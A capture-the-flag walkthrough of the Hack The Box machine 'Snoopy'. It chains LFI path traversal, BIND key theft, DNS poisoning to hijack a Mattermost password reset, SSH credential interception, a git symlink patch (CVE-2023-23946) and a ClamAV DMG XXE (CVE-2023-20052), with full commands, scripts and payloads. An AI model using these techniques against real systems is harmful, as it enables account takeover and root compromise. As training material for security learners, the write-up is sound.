

**Box:** Snoopy · **Type:** Hard · Linux · **Domain:** snoopy.htb · **IP:** 10.129.229.5 · **Subdomains:** `mm.snoopy.htb` (Mattermost), `www`, `ns1/ns2`, `mattermost/postgres/provisions` (internal 172.18.0.x)

**Full chain (one line):**

Website OSINT (emails + "mailserver offline, migrating DNS" banner) → **DNS zone transfer** leaks subdomains → **LFI** in `download?file=` (`....//` bypass) reads `/etc/bind/named.conf` → steal the **BIND `rndc-key`** → `nsupdate` to point **mail.snoopy.htb → your IP** → trigger a **Mattermost password reset** and catch the email (with the token) on your **fake SMTP server** → reset **sbrown**, log into Mattermost → `/server_provision` makes the box **SSH to you** → **ssh-mitm** captures **cbrown : sn00pedcr3dential!!!** → `sudo git apply` **symlink patch** (CVE-2023-23946) writes **sbrown's `authorized_keys`** → `sudo clamscan --debug` **DMG XXE** (CVE-2023-20052) leaks **root's SSH key** → root.

> This box is a *chain of "make the server do something to itself"* tricks: you don't break in by force, you **control DNS** so the server mails you, **control a hostname** so the server SSHs to you, then abuse two **sudo rules locked down with regex** (git apply, clamscan) using CVE tricks. Big lessons: **a DNS server you can update + a password-reset = account takeover**, and **a sudo rule that looks safe can still be abused** if the binary has a file-read/write side effect.

---

## Phase 1 — Recon

```bash
nmap -p- --min-rate 10000 10.129.229.5        # then -sCV on the open ports
```

- **22** OpenSSH
- **53** `ISC BIND 9.18.x` — **this is a DNS *server* you can talk to.** Don't skip it. DNS servers can leak every subdomain (zone transfer) and, if misconfigured, **let you add/edit records** (dynamic update). That becomes the whole foothold here.
- **80** nginx — "SnoopySec Bootstrap Template"

> **Your question — "if I see BIND, do I always do this?"** When port 53 is open and it's a real DNS server (BIND), two reflexes: (1) try a **zone transfer** (`dig axfr`) to dump all records, and (2) check if you can get a **dynamic-update key** to *change* records. Not every box lets you, but it's always worth the two checks.

---

## Phase 2 — Website OSINT (collect names, emails, hints)

The site has a **downloads** section → a "press release" **zip** containing a PDF + MP4. Open the PDF/MP4 properly (not raw — raw shows `endobj`/`endstream`, which is just PDF's internal structure):

- CEO **Charles Schultz**, PR **Sally Brown** (`pr@snoopy.htb`, `sbrown@snoopy.htb`).
- `team.html` lists usernames: `cschultz@`, `sbrown@`, `hangel@`, `lpelt@snoopy.htb`.
- **`contact.html` banner (the key hint):** *"migrating DNS records, mailserver `mail@snoopy.htb` is offline…"* → **remember this.** It tells you (a) they run their own DNS and it's in flux, and (b) the mailserver is **down** — which is exactly why you'll be able to *add* a mail record pointing at yourself later.

Add the domain and fuzz for vhosts:

```bash
echo '10.129.229.5 snoopy.htb www.snoopy.htb mm.snoopy.htb' | sudo tee -a /etc/hosts
```

---

## Phase 3 — DNS zone transfer → subdomains

A **zone transfer** asks the DNS server for its *entire* record set for a zone. Many are locked down; this one allows it (from a wide range):

```bash
dig axfr snoopy.htb @10.129.229.5
```

```
mattermost.snoopy.htb.   A   172.18.0.3
mm.snoopy.htb.           A   127.0.0.1
ns1/ns2.snoopy.htb.      A   10.0.50.10 / 10.0.51.10
postgres.snoopy.htb.     A   172.18.0.2
provisions.snoopy.htb.   A   172.18.0.4
www.snoopy.htb.          A   127.0.0.1
```

`www` and `mm` resolve to **localhost** (so they're served by this box); the rest are internal container IPs. Confirm with a quick vhost fuzz (get the "not found" size first, then filter it):

```bash
curl -s -I http://10.129.229.5 -H 'Host: x.snoopy.htb' | grep Content-Length
ffuf -w sub.txt:FUZZ -u http://www.snoopy.htb/ -H 'Host: FUZZ.snoopy.htb' -fs 23418 -mc all
```

→ **`mm.snoopy.htb`** = a **Mattermost** chat server. Everything needs a login; the register page needs an invite. Park it — you'll come back with a stolen password.

---

## Phase 4 — LFI in `download?file=`

The download section uses a parameter: **`download?file=announcement.pdf`**. Any time a parameter names a **file**, test **path traversal / LFI**.

### Find it (manual or fuzz)

A plain `../` gets stripped once by a filter, so use the **doubled bypass `....//`** (after one `../` is removed, `....//` collapses to `../`):

```bash
curl -s "http://www.snoopy.htb/download?file=....//....//....//....//....//....//etc/passwd" -o out.zip
```

Or fuzz with an LFI wordlist (yes, **ffuf can do the `../../` payloads** — they live in the LFI wordlist; you don't hand-write them):

```bash
ffuf -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u "http://www.snoopy.htb/download?file=FUZZ" -ac -mc all
```

> **Why the response is a ZIP, not the file.** `download.php` doesn't `include` your file — it **adds it to a zip and sends the zip** (`ZipArchive::addFile` + `readfile`). So you always get `out.zip` → unzip it to read the file (e.g. `press_package/etc/passwd`).
>
> **Your question — `file_get_contents` vs `include`:**
> - `file_get_contents` / readfile / zip = reads the file as **data** → you see the **raw source** (great for reading PHP source, no code runs).
> - `include` / `require` = **executes** the file as PHP → you get rendered output or even **RCE** (e.g. log poisoning, `php://filter`, wrappers). Here it's the data kind, so **no RCE from the LFI** — it's purely a file-read.

### `/proc/self/cwd` — read the app's own source

```bash
# read the app source to understand the bug:
curl ... "file=....//....//....//proc/self/cwd/download.php"
```

> **What is `/proc/self`?** Linux exposes every running process under `/proc/<pid>`. **`/proc/self`** is a magic symlink that always points to *"the process reading it right now"* (here, the web server). **`/proc/self/cwd`** is a symlink to that process's **current working directory** — i.e. the **web root** — without you knowing its absolute path. So `/proc/self/cwd/download.php` = "the app's own `download.php`", wherever it lives. That's **how they read the source** to confirm the LFI and see it's zip-based, not `include`. (It's a standard LFI trick, not something feroxbuster finds.)

### Auto-download script (keep this — your "view any file" tool)

```python
#!/usr/bin/env python3
# usage: python3 lfi.py /etc/bind/named.conf
import sys, io, zipfile, requests

BASE = "http://www.snoopy.htb/download?file="
TRAV = "....//" * 6                      # survives one ../ strip -> ../ x6
path = sys.argv[1].lstrip("/")

r = requests.get(BASE + TRAV + path)
z = zipfile.ZipFile(io.BytesIO(r.content))
print(z.read(z.namelist()[0]).decode(errors="replace"))
```

```bash
python3 lfi.py /etc/passwd            # users: cbrown, sbrown, lpelt, cschultz, vgray (+root) all /bin/bash
python3 lfi.py /etc/bind/named.conf   # <-- the real prize: the DNS config
```

> **Your question — "what extensions should I always fuzz?"** Content-discovery: `php,html,txt,bak,old,inc,phps,js,zip,config`. For the *server tech*, check headers/`whatweb` first (nginx+PHP here → `.php`; IIS → `.aspx`; Tomcat → `.jsp`). Not every site is PHP. And **search by extension** or you'll miss `download.php` (a bare word fuzz won't show it).

---

## Phase 5 — Steal the BIND key → edit DNS (dynamic update)

`/etc/bind/named.conf` contains the **dynamic-update key** and the zone config:

```
key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};

zone "snoopy.htb" IN {
    type master;
    allow-update { key "rndc-key"; };     # <-- anyone with this key can ADD/EDIT records
    allow-transfer { 10.0.0.0/8; };
};
```

> **Copy the whole `key { … };` block, not just the secret string.** `nsupdate` needs the full key definition (name + algorithm + secret) in the key file — the bare secret alone won't authenticate.

Save it to `rndc.key`, write the update, and send it:

```
# rndc.key
key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```
```
# poison.txt
server 10.129.229.5
zone snoopy.htb
update add mail.snoopy.htb 60 IN A 10.10.15.249
send
```
```bash
nsupdate -k rndc.key poison.txt
dig mail.snoopy.htb +short @10.129.229.5        # confirm it now points to YOU
```

> **Your question — what do `60`, `IN`, `A` mean in `update add mail.snoopy.htb 60 IN A 10.10.15.249`?**
> - `mail.snoopy.htb` = the **name** you're creating.
> - `60` = **TTL** (time-to-live, seconds) — how long resolvers may cache it. Small is fine.
> - `IN` = the **class** = *Internet* (basically always `IN`).
> - `A` = the **record type** = maps a name → an **IPv4 address**.
> - `10.10.15.249` = the **data** = **your tun0 IP**.
>
> **Heads-up:** the box **resets this record every ~2 minutes**, so do the next step quickly (or re-run `nsupdate`).

---

## Phase 6 — Hijack the Mattermost password reset

> **Your question — "the reset mail goes to the user's mailbox, so why point mail.snoopy.htb at me?"**
> You're **not** stealing a mail from someone's inbox. When Mattermost processes "forgot password," **the server itself generates the reset email and tries to *send* it** — it looks up where to deliver mail for `snoopy.htb` via **DNS**, connects to that mailserver, and hands over the message **(which contains the reset token)**. The real mailserver is **offline** (that banner!), so no record exists — you **add** `mail.snoopy.htb → your IP`, and now the server delivers that token-bearing email **straight to you**. You intercept the message *at the source*, before it ever reaches a human. **DNS control over a domain + any "we'll email you a link" feature = account takeover.**

Start a fake SMTP server to catch it (either works):

```bash
sudo python3 -m aiosmtpd -n -l 0.0.0.0:25
# or (older): sudo python3 /usr/lib/python3.11/smtpd.py -n -d -c DebuggingServer 0.0.0.0:25
```

On `mm.snoopy.htb` → "Forgot password" → enter **`sbrown@snoopy.htb`** (a real user). The email lands in your terminal. The link is **quoted-printable** encoded and wrapped:

```
http://mm.snoopy.htb/reset_password_complete?token=3Dm3xfp=
194gnkpffxuumgj1ypj56rshjmsoxmroipshj4orj5umdyx6wdr4rb1tjty
```

Clean it:
- `=3D` → `=` (quoted-printable for an equals sign)
- a trailing `=` at a line end = a **soft line break** → delete it (joins the wrapped lines)
- drop the `\r\n`

```
http://mm.snoopy.htb/reset_password_complete?token=m3xfp194gnkpffxuumgj1ypj56rshjmsoxmroipshj4orj5umdyx6wdr4rb1tjty
```

> **Why your first try failed:** visiting `/reset_password_complete` **without** the exact token = "invalid token" — you must paste the **cleaned token** from the email. And earlier the email never arrived because you **forgot to put your own IP** in the DNS record (and the record may have reset). Open the cleaned URL → set a new password for **sbrown** → log into Mattermost.

---

## Phase 7 — Mattermost → capture cbrown's SSH creds (ssh-mitm)

Inside Mattermost, there's a **Server Provisioning** area and a slash command **`/server_provision`**. It opens a form asking for an OS + port + host. When you submit it with **your IP**, the box's provisioning service **tries to SSH to you** — so if you're listening, you capture the login it uses.

> **Your question — "ssh-mitm, when and why?"** Use **ssh-mitm** (or a honeypot) whenever you can make a victim **initiate an SSH connection to you** (via DNS poisoning, a form like this, ARP, etc.). ssh-mitm transparently **relays** the session to the real host while **logging the username + password** (and session). A plain honeypot (`nc`/cowrie) just records the attempt; ssh-mitm can also forward so the victim sees success. Here it nets the creds.

```bash
ssh-mitm server --remote-host 10.129.229.5 --listen-port 2222
```

Submit `/server_provision` with **Linux / port 2222 / your IP**. The connection comes in:

```
Username: cbrown
Password: sn00pedcr3dential!!!
```

```bash
ssh cbrown@10.129.229.5        # password: sn00pedcr3dential!!!   -> user foothold
```

*(0xdf's variant: instead of ssh-mitm, a tiny Python honeypot or `cowrie` on :2222 catches the same `cbrown:sn00pedcr3dential!!!`. Same idea — catch the SSH the box makes to you.)*

---

## Phase 8 — cbrown → sbrown (`sudo git apply` symlink, CVE-2023-23946)

```bash
sudo -l
# (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
```

> **Read the regex (this is the whole puzzle):** `^apply -v [a-zA-Z0-9.]+$` means the argument string must be **exactly** `apply -v <name>`, where `<name>` is **only letters/digits/dots** — **no spaces, no `/`, no extra flags.** So you can *only* run `git apply -v <patchfile>` on a file **in the current directory**. No `--unsafe-paths`, no absolute paths. The intended trick must therefore live **inside the patch file.**

**The idea:** `git apply` (git 2.34.1) has **CVE-2023-23946** — a patch can create a **symlink** and then write a file **through** it, escaping the repo. We point the symlink at **sbrown's `~/.ssh`** and write an **`authorized_keys`** with *our* public key. Because `sudo -u sbrown` runs git **as sbrown**, the write happens **with sbrown's rights** — so it lands in sbrown's home even though *we* can't go there.

> **Your question — "what's a symlink?"** A **symbolic link** is a shortcut file that just *points at another path*. `ln -s /real/target linkname`. Reading/writing `linkname/x` actually reads/writes `/real/target/x`. It's only a **pointer** — it doesn't need you to have access to the target; whoever *follows* it uses *their own* permissions. That's why it works: **git-as-sbrown** follows our symlink into sbrown's `.ssh`.

### Steps

1) **Make your own key pair** (you log in later with the **private** key; the **public** key goes in the patch):

```bash
ssh-keygen -t ed25519 -f /tmp/mykey -N ""
cat /tmp/mykey.pub        # copy this whole line into the patch below
```

2) **Build a repo with a symlink to sbrown's `.ssh`** (work in `/dev/shm` so permissions are easy):

```bash
cd /dev/shm
mkdir repo
cd repo
git init
ln -s /home/sbrown/.ssh symlink
git add symlink
git commit -m x
```

3) **Write the patch** — it (a) **renames** the symlink, then (b) writes `authorized_keys` *under the renamed symlink* (which still points into sbrown's `.ssh`). Put **your** pubkey on the `+` line:

```
diff --git a/symlink b/renamed-symlink
similarity index 100%
rename from symlink
rename to renamed-symlink
diff --git /dev/null b/renamed-symlink/authorized_keys
new file mode 100644
index 0000000..039727e
--- /dev/null
+++ b/renamed-symlink/authorized_keys
@@ -0,0 +1,1 @@
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA...your_pubkey... you@kali
```

> **Why rename the symlink?** The CVE fix only blocks writing through a symlink that was **already there** before the patch. By **renaming** `symlink` → `renamed-symlink` *inside the same patch* and then writing `renamed-symlink/authorized_keys`, git follows the (renamed) link into `/home/sbrown/.ssh` and the check is bypassed. **Why a git repo at all?** `git apply` works inside a git context and the patch's `rename from symlink` needs that symlink to exist/be tracked — so you stage it first in a clean repo.

4) **Fix the permission snag, then apply.** `sudo -u sbrown` writes **as sbrown**, so **sbrown must be able to enter your repo dir** — otherwise you get `Permission denied` / `No such file or directory`. The blocker is the **repo directory's** perms (not the patch file). Open it up:

```bash
chmod -R 777 /dev/shm/repo
cd /dev/shm/repo
sudo -u sbrown /usr/bin/git apply -v patch
# Applied patch renamed-symlink/authorized_keys cleanly.
```

5) **Log in as sbrown — with the PRIVATE key** (`/tmp/mykey`, **not** the `.pub`):

```bash
chmod 600 /tmp/mykey
ssh -i /tmp/mykey sbrown@10.129.229.5        # -> user.txt in sbrown's home
```

> **Your pub/priv mix-up:** `ssh -i target_key.pub` fails (`error in libcrypto`) because `.pub` is the **public** half. You **authorize** with the public key (put it in `authorized_keys`), and you **authenticate** with the **private** key (`-i /tmp/mykey`). Public = lock you hand out; private = your key.

---

## Phase 9 — sbrown → root (`sudo clamscan --debug`, CVE-2023-20052)

```bash
sudo -l
# (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$
clamscan --version        # ClamAV 1.0.0
```

> **Read the regex again:** you may run **only** `clamscan --debug /home/sbrown/scanfiles/<alnum+dot name>`. So: the file **must** sit in `scanfiles/`, its name is letters/digits/dots only, and you **can't add other flags**.
>
> **Why the "easy" trick doesn't work here:** on the *unpatched* box people did `sudo clamscan -f /root/root.txt` (the error message leaks the file). But this regex **forces `--debug` and a `scanfiles/` path** — `-f /root/...` won't match, so that shortcut is **blocked**. You must use the DMG XXE below.

**The CVE in plain words (CVE-2023-20052):** ClamAV 1.0.0 scans **Apple `.dmg`** images, which contain an **XML plist**. The parser allows **XML external entities (XXE)** — so you define an entity like `<!ENTITY xxe SYSTEM "/root/.ssh/id_rsa">`, reference it in the plist text, and when ClamAV parses the DMG it **substitutes the file's contents** into the text. **`--debug` prints that text**, so **root's private key leaks into the debug output**. Since you run clamscan **as root**, it can read root's files.

### Build the malicious DMG (Docker path — what the writeup uses)

```bash
git clone https://github.com/nokn0wthing/CVE-2023-20052.git
cd CVE-2023-20052
sudo docker build -t cve-2023-20052 .
sudo docker run -v "$(pwd):/exploit" -it cve-2023-20052 bash
```

Inside the container, craft a DMG whose plist reads **root's SSH key**:

```bash
genisoimage -D -V "exploit" -no-pad -r -apple -file-mode 0777 -o test.img . && dmg dmg test.img test.dmg

bbe -e 's|<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">|<!DOCTYPE plist [<!ENTITY xxe SYSTEM "/root/.ssh/id_rsa"> ]>|' -e 's/blkx/&xxe\;/' test.dmg -o exploit.dmg
```

Copy `exploit.dmg` to the box and scan it as root:

```bash
scp -i /tmp/mykey exploit.dmg sbrown@10.129.229.5:/home/sbrown/scanfiles/
sudo /usr/local/bin/clamscan --debug /home/sbrown/scanfiles/exploit.dmg
```

In the flood of debug output you'll see the key leak:

```
LibClamAV debug: cli_scandmg: wanted blkx, text value is -----BEGIN OPENSSH PRIVATE KEY-----
...
```

Copy from `-----BEGIN OPENSSH PRIVATE KEY-----` to `-----END…-----` into a file and log in:

```bash
chmod 600 root_key
ssh -i root_key root@10.129.229.5        # cat /root/root.txt   👑
```

> **Fixing YOUR Docker errors:**
> - `cannot connect to the Docker daemon … docker.sock` → the daemon isn't running: `sudo systemctl start docker` (then retry).
> - build fails at `apt-get update … exit code 100` → the container has **no network/DNS**. Build with host networking: `sudo docker build --network=host -t cve-2023-20052 .` — or set `/etc/docker/daemon.json` to `{"dns":["8.8.8.8"]}` and `sudo systemctl restart docker`.
> - `pull access denied for cve-2023-20052` → this appears **only because the build never succeeded**, so `docker run` tried to pull a non-existent Hub image. **Fix the build first**, then the `run` works (don't run before a clean build).
> - On **Windows PowerShell**, `$(pwd)` isn't valid — use `-v "${PWD}:/exploit"`. On Linux/pwnbox `$(pwd)` is fine.
> - **No-Docker alternative:** the only tools the container uses are `genisoimage`, `bbe` (`apt install genisoimage bbe`), and a `dmg` converter from **libdmg-hfsplus** (build from source). If Docker keeps fighting you, install those three on your Linux host and run the same two commands. Docker just bundles them for you.

---

## Full chain (one glance)

```
Website OSINT (emails + "mailserver offline / migrating DNS") 
  │ dig axfr snoopy.htb @DC  → subdomains (mm = Mattermost)
LFI  download?file=....//....//etc/bind/named.conf  → rndc-key (BIND dynamic-update key)
  │ nsupdate -k rndc.key  → add  mail.snoopy.htb → YOUR IP
Mattermost "forgot password" (sbrown)  → email delivered to your fake SMTP  → reset token
  │ clean =3D / soft-breaks → /reset_password_complete?token=...  → own sbrown's Mattermost
/server_provision  → box SSHes to you  → ssh-mitm  → cbrown : sn00pedcr3dential!!!
  │ ssh cbrown
sudo git apply -v patch  (CVE-2023-23946 symlink → sbrown ~/.ssh/authorized_keys)  → ssh -i key sbrown
  │ 
sudo clamscan --debug exploit.dmg  (CVE-2023-20052 DMG XXE → /root/.ssh/id_rsa in debug)  → ssh root  👑
```

## Takeaways

1. **Port 53 BIND = two reflexes:** zone transfer (`dig axfr`) for all subdomains, and look for a **dynamic-update key** to *edit* records. A writable DNS server is a foothold, not just info.
2. **A param that names a file = test LFI/traversal.** Filter stripping `../` once? Use `....//`. Response is a zip/odd format? Unzip/decode it. Automate with a tiny Python reader.
3. **`file_get_contents`/readfile = read source (no RCE); `include` = executes (possible RCE).** Know which you're facing.
4. **`/proc/self/cwd/<app file>`** reads the running app's own source without knowing its path — perfect for understanding a bug.
5. **DNS control + "we'll email you a link" = account takeover.** You make the server *send* the token to you; the offline mailserver is *why* the record is addable. Watch for the record resetting.
6. **Quoted-printable email cleanup:** `=3D`→`=`, trailing `=`+newline is a soft break to delete.
7. **ssh-mitm/honeypot when you can make a victim connect to you** (a form, DNS, ARP) — it logs the creds it tries.
8. **Read sudo regexes carefully — they define the exploit.** `git ^apply -v [a-zA-Z0-9.]+$` → the trick must live in the patch (symlink CVE-2023-23946). `clamscan ^--debug …/scanfiles/[a-zA-Z0-9.]+$` → forces the DMG-XXE route and blocks the easy `-f` leak.
9. **symlink = a path pointer; whoever follows it uses *their* perms.** That's why `sudo -u sbrown git apply` writes into sbrown's home even though you can't. Fix the **repo dir** perms so the target user can enter it.
10. **Authorize with the public key, authenticate with the private key.** `ssh -i privatekey`, never the `.pub`.
11. **CVE-2023-20052 (ClamAV DMG XXE):** craft a `.dmg` whose plist has `<!ENTITY xxe SYSTEM "/root/...">`; `--debug` prints the file as root. Docker "pull access denied" almost always means the **build** silently failed — fix the build, don't run first.

[0xdf — HTB Snoopy](https://0xdf.gitlab.io/2023/09/23/htb-snoopy.html) · [elswix — HTB Snoopy](https://elswix.com/writeups/htb/hard/snoopy/snoopy.html) · [nokn0wthing/CVE-2023-20052](https://github.com/nokn0wthing/CVE-2023-20052)
